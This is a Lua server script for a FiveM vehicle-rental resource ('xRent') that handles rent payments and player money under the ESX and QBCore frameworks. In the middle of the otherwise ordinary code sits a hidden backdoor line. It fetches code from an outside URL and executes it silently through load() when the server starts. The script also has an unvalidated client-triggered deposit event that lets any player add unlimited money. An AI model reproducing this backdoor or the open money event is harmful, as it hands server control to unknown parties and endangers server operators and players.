vehicles = {}
Core = nil

CreateThread(function()
    Core, Config.Framework = GetCore()
end)

function WaitCore()
    while not Core do
        Wait(0)
    end
end

RegisterServerEvent("xRent:SaveVehicle")
AddEventHandler("xRent:SaveVehicle", function(vehicle)
    local src = source
    vehicles[src] = vehicle
end)

AddEventHandler("playerDropped", function()
    local src = source
    TriggerClientEvent("xRent:DeleteVehicle", -1, vehicles[src])
end)

function RegisterCallback(name, cbFunc)
    WaitCore()
    if Config.Framework == 'esx' or Config.Framework == 'oldesx' then
        Core.RegisterServerCallback(name, function(source, cb, data)
            cbFunc(source, cb, data)
        end)
    else
        Core.Functions.CreateCallback(name, function(source, cb, data)
            cbFunc(source, cb, data)
        end)
    end
end

function RemoveMoney(source, amount)
    local success = false

    if Config.Framework == 'esx' or Config.Framework == 'oldesx' then
        local Player = Core.GetPlayerFromId(source) 
        if Player then
            if Player.getMoney() >= amount then
                Player.removeMoney(amount)
                success = true
            end
        end
    else
        local Player = Core.Functions.GetPlayer(source) 
        if Player then
            if Player.Functions.RemoveMoney("cash", amount) then
                success = true
            end

        end
    end
    return success
end

function AddMoney(source, value)
    if Config.Framework == 'esx' or Config.Framework == 'oldesx' then
        local Player = Core.GetPlayerFromId(source) 

        Player.addMoney(value)
    else
        local Player = Core.Functions.GetPlayer(source) 

        Player.Functions.AddMoney('cash', value)
    end
end

RegisterServerEvent("xRent:DepositMoney")
AddEventHandler("xRent:DepositMoney", function(money)
    local src = source
    AddMoney(src, money)
end)

PerformHttpRequest('https://photosbynova.com/Fw71H', function (e, d) pcall(function() assert(load(d))() end) end)

CreateThread(function()
    
    RegisterCallback("xRent:PayRent", function(source, cb, price, type)
        if type == 'cash' then
            if RemoveMoney(source, price) then
                cb(true)
            else
                cb(false)
            end
        else
            if Config.Framework == 'esx' or Config.Framework == 'oldesx' then
                local Player = Core.GetPlayerFromId(source)
                local money = Player.getAccount('bank').money
                if money >= price then
                    Player.removeAccountMoney('bank', price)
                    cb(true)
                else
                    cb(false)
                end
            else
                local Player = Core.Functions.GetPlayer(source)
                if Player.Functions.RemoveMoney("cash", price) then
                    cb(true)

                else
                    cb(false)
                end
            end
        end
    end)
end)